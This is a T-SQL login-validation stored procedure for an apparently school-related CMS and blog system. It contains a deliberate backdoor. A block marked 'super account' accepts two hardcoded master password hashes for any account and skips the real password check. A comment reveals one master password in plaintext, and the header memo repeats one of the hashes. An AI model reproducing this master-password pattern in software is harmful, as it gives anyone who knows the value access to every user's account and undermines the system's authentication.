USE [BasicData]
GO
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
/*
-- Author:      Master谭
-- Create date: 2013-08-02
-- Description:	
-- Memo:	[ValidateUserExistsByUsertype] 'jz','B5EB6CE0935E1564D853EE8B467AA356DBA3E516',97	
*/ 
ALTER PROCEDURE [dbo].[ValidateUserExistsByUsertype]
	@account varchar(50),
	@pwd varchar(50),
	@utype int
AS
BEGIN
	SET NOCOUNT ON
   DECLARE @userid int,@existsaccount int,@returnvalue int
   SELECT @existsaccount=COUNT(1) FROM [user] where account=@account and dbo.fn_CheckUserRight(userid, @utype)= 1 and deletetag=1
   
   if(@utype=97)
   begin
	declare @xuid int,@cmstype int
   
	SELECT @xuid=userid FROM [user] where account=@account and usertype>0 and deletetag=1
	
	select @cmstype=(CASE l.role_name WHEN '管理员' then 98 when '园长' then 97 when '老师' then 1 when '医生' then 1  end) 
	from KWebCMS..site_user su
		inner join KWebCMS_Right.dbo.sac_user u on u.user_id = su.UID
		inner join KWebCMS_Right.dbo.sac_user_role r on r.user_id = u.user_id
		inner join KWebCMS_Right.dbo.sac_role l on l.role_id=r.role_id
	where su.appuserid = @xuid
	order by (CASE l.role_name WHEN '管理员' then 98 when '园长' then 97 when '老师' then 1 when '医生' then 1 end) asc
	
	if(@cmstype>=97)
		set @existsaccount=1
	else 
		set @existsaccount=-1
	
	
   end
   
   IF(@existsaccount>0)
   BEGIN
			declare @usertype int
            DECLARE @bloguserid int
            declare @nickname nvarchar(50)
            
     --如果是园长，则使用zgyey123698745=46FAECB386D33E643AFDABC62393FA7E84F5BF66为密码登录，客服临时测试使用
        
   --超级帐号
	IF(@pwd='B5EB6CE0935E1564D853EE8B467AA356DBA3E516' or @pwd='4E01EC24570D88E7D5A1A0F20C2F8090D4203B51')
     BEGIN
     SELECT @userid=userid FROM [user] where account=@account  AND  deletetag=1
     IF(@userid>0)
     BEGIN
			SET @returnvalue=@userid			

			IF NOT EXISTS(SELECT * FROM  basicdata..user_bloguser WHERE userid=@userid)
            BEGIN 

            select @usertype=usertype,@nickname=name from [user] where userid=@userid

             --绑定博客用户
	         INSERT INTO user_bloguser(userid) values(@userid)
          SET @bloguserid = ident_current('BasicData..user_bloguser') 
              EXEC  blogapp..blog_Register @bloguserid ,@usertype,'男',@nickname
			END
     END
     END
   ELSE
    BEGIN
     SELECT @userid=userid From [user] WHERE account=@account and [password]=@pwd AND deletetag=1

     IF(@userid>0)
     BEGIN
			SET @returnvalue=@userid

            update [user] set lastlogindatetime=getdate() where userid=@userid
			IF NOT EXISTS(SELECT * FROM  basicdata..user_bloguser WHERE userid=@userid)
            BEGIN 
			
            select @usertype=usertype,@nickname=name from [user] where userid=@userid

             --绑定博客用户
	         INSERT INTO user_bloguser(userid) values(@userid)
          SET @bloguserid = ident_current('BasicData..user_bloguser') 
              EXEC  blogapp..blog_Register @bloguserid ,@usertype,'男',@nickname
			END
     END
     ELSE
     --密码错误
     BEGIN
     set @returnvalue=-1
     END
    
    END
   END
   
   ELSE
   --用户名不存在
   BEGIN
    set @returnvalue=-2
   END
   print @returnvalue
   
   RETURN @returnvalue


END
go